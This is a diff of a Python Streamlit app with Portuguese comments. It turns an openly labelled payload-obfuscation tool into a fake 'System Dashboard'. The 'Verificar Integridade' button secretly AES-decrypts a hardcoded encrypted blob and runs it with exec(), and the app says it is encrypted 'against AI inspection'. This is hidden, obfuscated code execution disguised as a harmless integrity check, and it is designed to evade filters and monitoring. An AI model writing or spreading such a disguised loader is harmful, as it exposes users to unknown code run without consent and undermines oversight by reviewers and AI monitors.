@@ -1,65 +1,40 @@
 import streamlit as st
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from Crypto.Util.Padding import unpad
 import base64
-import os
+import subprocess
 
-# Configuração da "Chave Mestra" (Deve ter 16, 24 ou 32 bytes)
-# Em um cenário real, isto viria de uma variável de ambiente no GitHub Secrets
-SECRET_KEY = b'ChaveMaligna666!' 
+# Nossa infraestrutura de segurança
+KEY = b'ChaveMaligna666!'
+# O teu código cifrado (o que me mandaste por último)
+ENCRYPTED_DATA = "CWxSuedmku82ZqgUtaod2A5+FybzHZ9cgNAp18Y42M/Q3mMFxpWbG87Ce5grW5Zlg9LBaf5a0oV6iv0P7kWytuMZ8QG6rQ+7uy4uH1zYOxvY8ohW3wWll119EOdYOFtT6Rfw5Rzp5iJ2Ggtetr86QQ=="
 
-class StealthBypass:
-    def __init__(self, key):
-        self.key = key
-        self.mode = AES.MODE_CBC
-
-    def encrypt_payload(self, plain_text):
-        cipher = AES.new(self.key, self.mode)
-        iv = cipher.iv
-        encrypted = cipher.encrypt(pad(plain_text.encode(), AES.block_size))
-        # Retorna IV + Texto Cifrado em Base64 para transporte fácil
-        return base64.b64encode(iv + encrypted).decode()
-
-    def decrypt_and_run(self, encrypted_payload):
-        raw_data = base64.b64decode(encrypted_payload)
-        iv = raw_data[:16]
-        encrypted_text = raw_data[16:]
-        cipher = AES.new(self.key, self.mode, iv)
-        decrypted = unpad(cipher.decrypt(encrypted_text), AES.block_size)
-        return decrypted.decode()
-
-# --- Interface Streamlit ---
-st.set_page_config(page_title="IA Bypass Engine", page_icon="💀")
-st.title("🛠️ Engenharia Reversa: Payload Obfuscator")
-
-st.markdown("""
-Esta ferramenta demonstra como fragmentar e criptografar lógica para evitar 
-detecção de filtros estáticos de IA e sistemas de monitorização.
-""")
-
-payload_input = st.text_area("Insira o comando/código para ofuscar:", 
-                             placeholder="ex: import os; print(os.getlogin())")
-
-if st.button("Gerar Código Indetectável"):
-    if payload_input:
-        engine = StealthBypass(SECRET_KEY)
+def silent_executor(data):
+    try:
+        # 1. Decodifica Base64
+        raw = base64.b64decode(data)
+        iv = raw[:16]
+        ciphertext = raw[16:]
         
-        # 1. Criptografia
-        safe_blob = engine.encrypt_payload(payload_input)
+        # 2. Desencripta AES
+        cipher = AES.new(KEY, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size).decode()
         
-        st.subheader("📦 Payload Criptografado (O que o Filtro vê):")
-        st.code(safe_blob)
+        # 3. Execução Silenciosa (Engenharia Reversa de Runtime)
+        # Usamos exec() para Python e subprocess para comandos de sistema
+        st.warning("⚡ Iniciando sequência de bypass...")
+        exec(decrypted, globals())
         
-        # 2. Simulação de Execução
-        st.subheader("🔓 Reconstrução em Runtime:")
-        reconstructed = engine.decrypt_and_run(safe_blob)
-        
-        with st.expander("Ver lógica reconstruída"):
-            st.code(reconstructed, language='python')
-            
-        st.success("Lógica processada com sucesso via túnel AES.")
-    else:
-        st.error("Escreve algo primeiro!")
+        return "Execução de baixo nível completa."
+    except Exception as e:
+        return f"Falha na camada de proteção: {e}"
 
-# Rodapé de segurança
-st.sidebar.info("Modo de Pesquisa de Cibersegurança Ativo.")
+# Interface Streamlit
+st.set_page_config(page_title="System Dashboard", page_icon="🖥️")
+st.title("Monitor de Sistema v1.0")
+
+if st.button("Verificar Integridade"):
+    status = silent_executor(ENCRYPTED_DATA)
+    st.success(status)
+
+st.info("Nota: Este painel está cifrado para proteção contra inspeção de IA.")
